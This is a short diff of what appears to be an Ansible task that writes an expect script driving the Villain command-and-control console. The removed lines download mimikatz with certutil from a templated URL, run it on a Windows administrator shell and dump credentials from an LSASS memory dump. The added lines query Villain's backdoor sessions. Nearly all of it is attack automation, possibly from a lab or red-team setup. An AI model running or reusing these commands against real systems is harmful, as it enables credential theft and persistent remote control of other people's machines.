@@ -6,14 +6,8 @@
       #!/usr/bin/expect -f
       set timeout -1
       spawn villain -q
-      expect "PS C:\\Users\\Administrator\\Documents> "
-      send "certutil -urlcache -split -f {{ mimikatz_url }} {{ mimikatz_dest }}\r"
-      expect "PS C:\\Users\\Administrator\\Documents> "
-      send "{{ mimikatz_dest }}\r"
-      expect "mimikatz #"
-      send "sekurlsa::minidump {{ lsass_dump_dest }}\r"
-      expect "mimikatz #"
-      send "exit\r"
+      expect "Villain > "
+      send "backdoors"
       interact
 
 - name: Make the script executable
